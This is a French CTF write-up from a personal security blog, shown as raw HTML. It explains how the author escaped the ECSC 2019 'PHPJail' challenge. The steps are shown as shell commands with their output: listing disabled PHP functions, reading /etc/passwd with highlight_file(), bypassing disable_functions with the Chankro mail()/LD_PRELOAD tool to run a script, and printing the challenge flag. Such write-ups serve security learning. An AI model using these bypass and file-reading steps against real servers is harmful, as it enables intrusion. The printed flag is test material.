@@ -1,0 +1,136 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[ECSC] - PHPJail - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[ECSC] - PHPJail"><meta property="og:description" content="Description Saurez-vous sortir de cette prison PHP pour retrouver le fichier flag présent sur le système ?
+Etat des lieux Nous sommes face à une jail PHP, commençons par un phpinfo(); histoire de voir ce qui n&rsquo;est pas autorisé:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ➜ phpjail cat <(echo &#34;phpinfo();&#34;) - | nc challenges.ecsc-teamfrance.fr 4002 /// PHP JAIL //// There's a file named flag on this filesystem."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/ecscfrench2019phpjail/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-06-27T21:57:40+08:00"><meta property="article:modified_time" content="2019-06-27T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[ECSC] - PHPJail"><meta name=twitter:description content="Description Saurez-vous sortir de cette prison PHP pour retrouver le fichier flag présent sur le système ?
+Etat des lieux Nous sommes face à une jail PHP, commençons par un phpinfo(); histoire de voir ce qui n&rsquo;est pas autorisé:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ➜ phpjail cat <(echo &#34;phpinfo();&#34;) - | nc challenges.ecsc-teamfrance.fr 4002 /// PHP JAIL //// There's a file named flag on this filesystem."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/ecscfrench2019phpjail/><link rel=prev href=maki.bzh/writeups/tamu2019honeypots/><link rel=next href=maki.bzh/writeups/ecscfrench2019petitenote/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[ECSC] - PHPJail","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/ecscfrench2019phpjail\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"anssi, ecsc, jail, php, chankro","wordcount":627,"url":"maki.bzh\/writeups\/ecscfrench2019phpjail\/","datePublished":"2019-06-27T21:57:40+08:00","dateModified":"2019-06-27T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[ECSC] - PHPJail</h1><div class=content id=content><h2 id=description>Description</h2><blockquote><p>Saurez-vous sortir de cette prison PHP pour retrouver le fichier flag présent sur le système ?</p></blockquote><h2 id=etat-des-lieux>Etat des lieux</h2><p>Nous sommes face à une jail PHP, commençons par un <code>phpinfo();</code> histoire de voir ce qui n&rsquo;est pas autorisé:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  phpjail cat &lt;<span class=o>(</span><span class=nb>echo</span> <span class=s2>&#34;phpinfo();&#34;</span><span class=o>)</span> - <span class=p>|</span> nc challenges.ecsc-teamfrance.fr <span class=m>4002</span>
+</span></span><span class=line><span class=cl>    /// PHP JAIL ////
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    There<span class=err>&#39;</span>s a file named flag on this filesystem.
+</span></span><span class=line><span class=cl>    Find it.
+</span></span><span class=line><span class=cl>    Read it.
+</span></span><span class=line><span class=cl>    Flag it.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enter your command: phpinfo<span class=o>()</span>
+</span></span><span class=line><span class=cl>PHP <span class=nv>Version</span> <span class=o>=</span>&gt; 7.0.33-0+deb9u3
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=nv>disable_classes</span> <span class=o>=</span>&gt; Directory, DirectoryIterator, FilesystemIterator, GlobIterator, RecursiveDirectoryIterator, SplFileObject, <span class=nv>SplFileInfo</span> <span class=o>=</span>&gt; Directory, DirectoryIterator, FilesystemIterator, GlobIterator, RecursiveDirectoryIterator, SplFileObject, SplFileInfo
+</span></span><span class=line><span class=cl><span class=nv>disable_functions</span> <span class=o>=</span>&gt; system, exec, shell_exec, passthru, show_source, popen, proc_open, fopen_with_path, dbmopen, dbase_open, move_uploaded_file, chdir, mkdir, rmdir, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo, fopen, fread, file_get_contents, readfile, opendir, readdir, scandir, glob, file, dir, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix, _getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, virtual, openlog, closelog, ini_set, ini_restore, ignore_user_abort, link, pcntl_alarm, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, <span class=nv>is_dir</span> <span class=o>=</span>&gt; system, exec, shell_exec, passthru, show_source, popen, proc_open, fopen_with_path, dbmopen, dbase_open, move_uploaded_file, chdir, mkdir, rmdir, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo, fopen, fread, file_get_contents, readfile, opendir, readdir, scandir, glob, file, dir, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix, _getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, virtual, openlog, closelog, ini_set, ini_restore, ignore_user_abort, link, pcntl_alarm, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, is_dir
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Bon, ça fait un paquet de choses interdites.</p><h2 id=read-everywhere>Read everywhere</h2><p>La fonction <code>highlight_file();</code> n&rsquo;est pas bloqué, on va s&rsquo;en servir pour lire des fichiers :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  phpjail cat &lt;<span class=o>(</span><span class=nb>echo</span> <span class=s2>&#34;highlight_file(&#39;/etc/passwd&#39;);&#34;</span><span class=o>)</span> - <span class=p>|</span> nc challenges.ecsc-teamfrance.fr <span class=m>4002</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    /// PHP JAIL ////
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    There<span class=err>&#39;</span>s a file named flag on this filesystem.
+</span></span><span class=line><span class=cl>    Find it.
+</span></span><span class=line><span class=cl>    Read it.
+</span></span><span class=line><span class=cl>    Flag it.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enter your command: &lt;code&gt;&lt;span <span class=nv>style</span><span class=o>=</span><span class=s2>&#34;color: #000000&#34;</span>&gt;
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash&lt;br /&gt;daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;br /&gt;bin❌2:2:bin:/bin:/usr/sbin/nologin&lt;br /&gt;sys❌3:3:sys:/dev:/usr/sbin/nologin&lt;br /&gt;sync❌4:65534:sync:/bin:/bin/sync&lt;br /&gt;games❌5:60:games:/usr/games:/usr/sbin/nologin&lt;br /&gt;man❌6:12:man:/var/cache/man:/usr/sbin/nologin&lt;br /&gt;lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;br /&gt;mail❌8:8:mail:/var/mail:/usr/sbin/nologin&lt;br /&gt;news❌9:9:news:/var/spool/news:/usr/sbin/nologin&lt;br /&gt;uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;br /&gt;proxy❌13:13:proxy:/bin:/usr/sbin/nologin&lt;br /&gt;www-data❌33:33:www-data:/var/www:/usr/sbin/nologin&lt;br /&gt;backup❌34:34:backup:/var/backups:/usr/sbin/nologin&lt;br /&gt;list❌38:38:Mailing<span class=p>&amp;</span>nbsp<span class=p>;</span>List<span class=p>&amp;</span>nbsp<span class=p>;</span>Manager:/var/list:/usr/sbin/nologin&lt;br /&gt;irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;br /&gt;gnats❌41:41:Gnats<span class=p>&amp;</span>nbsp<span class=p>;</span>Bug-Reporting<span class=p>&amp;</span>nbsp<span class=p>;</span>System<span class=p>&amp;</span>nbsp<span class=p>;</span><span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin&lt;br /&gt;nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;br /&gt;_apt❌100:65534::/nonexistent:/bin/false&lt;br /&gt;Debian-exim❌101:101::/var/spool/exim4:/bin/false&lt;br /&gt;messagebus❌102:103::/var/run/dbus:/bin/false&lt;br /&gt;user0❌999:999::/home/user0:/bin/zsh&lt;br /&gt;&lt;/span&gt;
+</span></span><span class=line><span class=cl>&lt;/code&gt;
+</span></span><span class=line><span class=cl>Bye!
+</span></span></code></pre></td></tr></table></div></div><h2 id=command-execution>Command execution</h2><p>On peut remarquer que la fonction <code>mail();</code> n&rsquo;est pas non plus bloquée, on pourrait s&rsquo;en servir.</p><blockquote><p><a href=https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/ target=_blank rel="noopener noreffer">https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/</a></p></blockquote><p>Tarlogic a fait un outil permettant de créer un fichier PHP avec le payload et les libs embarqués:</p><blockquote><p><a href=https://github.com/TarlogicSecurity/Chankro target=_blank rel="noopener noreffer">https://github.com/TarlogicSecurity/Chankro</a></p></blockquote><p>Premièrement, localiser le fichier flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Chankro<span class=o>)</span> ➜  Chankro git:<span class=o>(</span>master<span class=o>)</span> ✗ cat rev.sh
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>find / -name flag &gt; /tmp/asas
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>Chankro<span class=o>)</span> ➜  Chankro git:<span class=o>(</span>master<span class=o>)</span> ✗ python chankro.py --arch <span class=m>64</span> --input rev.sh --output chan.php --path /tmp/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>     -<span class=o>=[</span> Chankro <span class=o>]=</span>-
+</span></span><span class=line><span class=cl>    -<span class=o>={</span> @TheXC3LL <span class=o>}=</span>-
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Binary file: rev.sh
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Architecture: x64
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Final PHP: chan.php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> File created!
+</span></span></code></pre></td></tr></table></div></div><p>Pour pouvoir executer le contenu de <code>chan.php</code> on va virer les balises PHP <code>&lt;?php ?></code> et les saut de lignes. Lorsque c&rsquo;est fait, il ne reste plus qu&rsquo;à l&rsquo;envoyer:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Chankro<span class=o>)</span> ➜  Chankro git:<span class=o>(</span>master<span class=o>)</span> ✗ cat chan.php - <span class=p>|</span> nc challenges.ecsc-teamfrance.fr <span class=m>4002</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>Enter your command:
+</span></span><span class=line><span class=cl>Bye!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>Chankro<span class=o>)</span> ➜  Chankro git:<span class=o>(</span>master<span class=o>)</span> ✗ cat &lt;<span class=o>(</span><span class=nb>echo</span> <span class=s2>&#34;highlight_file(&#39;/tmp/asas&#39;);&#34;</span><span class=o>)</span> - <span class=p>|</span> nc challenges.ecsc-teamfrance.fr <span class=m>4002</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>Enter your command: &lt;code&gt;&lt;span <span class=nv>style</span><span class=o>=</span><span class=s2>&#34;color: #000000&#34;</span>&gt;
+</span></span><span class=line><span class=cl>/home/user0/.sensitive/randomdir/flag&lt;br /&gt;/usr/local/lib/python2.7/dist-packages/pwnlib/flag&lt;br /&gt;&lt;/span&gt;
+</span></span><span class=line><span class=cl>&lt;/code&gt;
+</span></span><span class=line><span class=cl>Bye!
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>/home/user0/.sensitive/randomdir/flag</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Chankro<span class=o>)</span> ➜  Chankro git:<span class=o>(</span>master<span class=o>)</span> ✗ cat &lt;<span class=o>(</span><span class=nb>echo</span> <span class=s2>&#34;highlight_file(&#39;/home/user0/.sensitive/randomdir/flag&#39;);&#34;</span><span class=o>)</span> - <span class=p>|</span> nc challenges.ecsc-teamfrance.fr <span class=m>4002</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>Enter your command: &lt;code&gt;&lt;span <span class=nv>style</span><span class=o>=</span><span class=s2>&#34;color: #000000&#34;</span>&gt;
+</span></span><span class=line><span class=cl>ECSC<span class=o>{</span>22b1843abfd76008ce3683e583c66e85c6bbdc65<span class=o>}</span>&lt;br /&gt;&lt;/span&gt;
+</span></span><span class=line><span class=cl>&lt;/code&gt;
+</span></span><span class=line><span class=cl>Bye!
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag>Flag</h2><blockquote><p>ECSC{22b1843abfd76008ce3683e583c66e85c6bbdc65}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
